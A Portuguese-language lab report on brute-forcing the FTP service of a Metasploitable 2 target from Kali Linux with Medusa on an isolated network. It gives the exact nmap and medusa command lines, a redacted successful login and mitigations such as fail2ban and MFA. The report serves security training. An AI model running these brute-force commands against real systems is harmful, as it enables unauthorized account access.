# Relatório Técnico — Metasploitable + Medusa Lab

## Sumário Executivo
Este documento descreve os testes de força-bruta realizados em um ambiente isolado (Kali Linux como atacante e Metasploitable 2 como alvo). O foco inicial é o cenário FTP, seguido por HTTP (DVWA) e SMB. Os testes demonstraram credenciais fracas em serviços essenciais, permitindo acesso não autorizado em ambiente controlado. Recomendações técnicas e operacionais são apresentadas ao final.

---

## 1 — Cenário FTP (prioritário)

### 1.1 Objetivo
Avaliar a resistência do serviço FTP do Metasploitable 2 contra ataques de força-bruta utilizando **Medusa**, identificar credenciais fracas e validar o impacto de um acesso obtido.

### 1.2 Ambiente
- **Alvo:** `192.168.56.102` (Metasploitable 2)  
- **Atacante:** `192.168.56.10` (Kali Linux)  
- **Rede:** Host-Only / Internal Network (isolada)  
- **Ferramentas:** `medusa`, `nmap`, `ftp`  
- **Wordlists:** `wordlists/ftp-users.txt`, `wordlists/ftp-pass.txt`

### 1.3 Metodologia
1. Reconhecimento com `nmap` para confirmar serviço FTP e versão.  
2. Execução de ataque de força-bruta com `medusa` usando listas separadas de usuários e senhas.  
3. Validação do resultado conectando via cliente FTP.  
4. Registro de evidências (saídas sanitizadas, screenshot do login FTP autorizado).

### 1.4 Comandos executados
**Reconhecimento**
```bash
nmap -sV -p 21 192.168.56.102 -oA scans/nmap-ftp
```

**Força-bruta com Medusa**
```bash
medusa -h 192.168.56.102 -U wordlists/ftp-users.txt -P wordlists/ftp-pass.txt -M ftp -T 6 -f -v
```

### 1.5 Resultado (sanitizado)
```
[+] 192.168.56.102:21 FTP: Login successful: '***REDACTED***' '***REDACTED***'
```

### 1.6 Validação
- Conexão via cliente `ftp` confirmada com as credenciais encontradas:
```bash
ftp 192.168.56.102
# login: ***REDACTED***  / ***REDACTED***
```
- Screenshot sanitizada salva em `evidence/screenshots/ftp-login.png`.  
- Saída completa sanitizada em `scans/ftp-output.txt`.

### 1.7 Impacto
A obtenção de credenciais FTP com privilégios (ex.: `root`) permite:

- Transferir e modificar arquivos no sistema alvo.  
- Fazer upload de webshells ou backdoors em serviços que aceitem arquivos.  
- Escalonar acesso e realizar movimentação lateral se outras contas/serviços compartilharem credenciais.  
- Comprometer integridade, confidencialidade e disponibilidade dos dados; em produção, representa risco crítico de comprometimento total do sistema.

### 1.8 Mitigações recomendadas
1. **Lockout temporário**: bloquear conta/IP após N tentativas falhas (ex.: fail2ban).  
2. **Política de senhas fortes**: exigir complexidade, comprimento mínimo e expiração periódica.  
3. **Desabilitar serviços desnecessários**: remover/encapsular FTP se não for requerido; usar SFTP/FTPS quando necessário.  
4. **Monitoramento e alerting**: gerar alertas para picos de tentativas de autenticação e comportamentos anômalos.  
5. **Segurança por design**: segmentar rede e aplicar princípio do menor privilégio para reduzir impacto lateral.  
6. **Autenticação multifator (MFA)**: adicionar camada extra para contas críticas.  
7. **Inventário e hardening**: identificar imagens/serviços padrão com credenciais públicas e corrigir ou remover antes da produção.

### 1.9 Lições aprendidas
- Wordlists direcionadas e ferramentas automatizadas (ex.: `medusa`) conseguem comprometer contas fracas muito rapidamente em ambientes vulneráveis.  
- A existência de contas padrão/fracas em imagens demonstra a necessidade de processos de hardening e revisão antes do uso.  
- Testes em ambiente controlado são essenciais para validar detecção, resposta e mitigação (ex.: configurar fail2ban e monitorar alertas).  
- Documentar comandos, evidências e procedimentos facilita replicação do teste e aplicação das correções.
